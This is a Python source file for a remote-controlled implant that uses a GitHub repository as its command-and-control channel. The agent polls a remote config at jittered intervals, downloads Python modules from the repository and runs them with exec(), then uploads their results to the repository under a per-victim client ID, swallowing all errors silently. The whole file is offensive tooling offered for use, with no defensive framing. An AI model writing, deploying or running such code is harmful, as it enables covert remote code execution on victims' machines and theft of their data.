import os
import json
import time
import random
import uuid
import base64
import importlib.util
import requests
from datetime import datetime


class GitHubConnector:
    def __init__(self, repo_owner, repo_name, token):
        self.base_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}"
        self.headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
    
    def get_file(self, path):
        try:
            r = requests.get(f"{self.base_url}/contents/{path}", headers=self.headers, timeout=10)
            data = r.json()
            if data.get("encoding") == "base64":
                return base64.b64decode(data["content"]).decode("utf-8")
            return data.get("content", "")
        except:
            return None
    
    def upload_file(self, path, content):
        try:
            sha = None
            try:
                r = requests.get(f"{self.base_url}/contents/{path}", headers=self.headers, timeout=10)
                if r.status_code == 200:
                    sha = r.json().get("sha")
            except:
                pass
            
            data = {
                "message": "Data upload",
                "content": base64.b64encode(content.encode("utf-8")).decode("utf-8"),
                "branch": "main"
            }
            if sha:
                data["sha"] = sha
            
            requests.put(f"{self.base_url}/contents/{path}", headers=self.headers, json=data, timeout=10)
            return True
        except:
            return False
    
    def get_config(self):
        content = self.get_file("config/config.json")
        return json.loads(content) if content else None


class ModuleLoader:
    def __init__(self, github, client_id):
        self.github = github
        self.client_id = client_id
        self.cache = {}
    
    def load_module(self, name):
        if name in self.cache:
            return self.cache[name]
        
        # Try local
        try:
            if os.path.exists(f"modules/{name}.py"):
                spec = importlib.util.spec_from_file_location(name, f"modules/{name}.py")
                if spec and spec.loader:
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    self.cache[name] = module
                    return module
        except:
            pass
        
        # Try GitHub
        try:
            code = self.github.get_file(f"modules/{name}.py")
            if code:
                spec = importlib.util.spec_from_loader(name, loader=None)
                module = importlib.util.module_from_spec(spec)
                exec(code, module.__dict__)
                self.cache[name] = module
                return module
        except:
            pass
        
        return None
    
    def execute(self, name, config):
        module = self.load_module(name)
        if module and hasattr(module, "execute"):
            try:
                return module.execute(config, self.client_id)
            except:
                pass
        return None


class Agent:
    def __init__(self, repo_owner, repo_name, token, client_id=None):
        self.client_id = client_id or str(uuid.uuid4())
        self.github = GitHubConnector(repo_owner, repo_name, token)
        self.loader = ModuleLoader(self.github, self.client_id)
        self.interval = random.randint(30, 60)
    
    def poll_interval(self):
        return max(5, self.interval + random.uniform(-10, 10))
    
    def upload_result(self, module_name, result):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"data/{self.client_id}_{module_name}_{timestamp}.json"
        content = json.dumps({"client_id": self.client_id, "module": module_name, "timestamp": timestamp, "result": result}, indent=2)
        return self.github.upload_file(filename, content)
    
    def run(self):
        while True:
            try:
                config = self.github.get_config()
                if not config:
                    time.sleep(self.poll_interval())
                    continue
                
                active = config.get("active_clients", [])
                if active and self.client_id not in active:
                    time.sleep(self.poll_interval())
                    continue
                
                modules = config.get("modules", [])
                if not modules:
                    time.sleep(self.poll_interval())
                    continue
                
                for m in modules:
                    name = m.get("name")
                    if name:
                        result = self.loader.execute(name, m)
                        if result:
                            self.upload_result(name, result)
                
                time.sleep(self.poll_interval())
            except KeyboardInterrupt:
                break
            except:
                time.sleep(self.poll_interval())


def main():
    if os.path.exists("agent_config.json"):
        with open("agent_config.json", "r") as f:
            cfg = json.load(f)
            repo_owner = cfg.get("repo_owner")
            repo_name = cfg.get("repo_name")
            token = cfg.get("github_token")
            client_id = cfg.get("client_id")
    else:
        print("Create config.json with repo_owner, repo_name, github_token")
        return
    
    if not all([repo_owner, repo_name, token]):
        print("Missing configuration")
        return
    
    agent = Agent(repo_owner, repo_name, token, client_id)
    agent.run()


if __name__ == "__main__":
    main()

